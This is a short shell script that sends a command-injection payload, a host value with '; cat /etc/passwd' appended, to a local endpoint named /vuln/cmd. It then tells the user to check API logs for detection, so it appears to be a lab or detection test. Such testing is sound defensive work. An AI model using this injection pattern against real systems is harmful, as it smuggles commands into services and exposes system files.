#!/usr/bin/env bash
curl -X POST "http://localhost:8080/vuln/cmd" \
     -H "Content-Type: application/json" \
     -d '{"host": "8.8.8.8; cat /etc/passwd"}'

echo -e "\n\nPayload Sent. Check API logs for detection!"
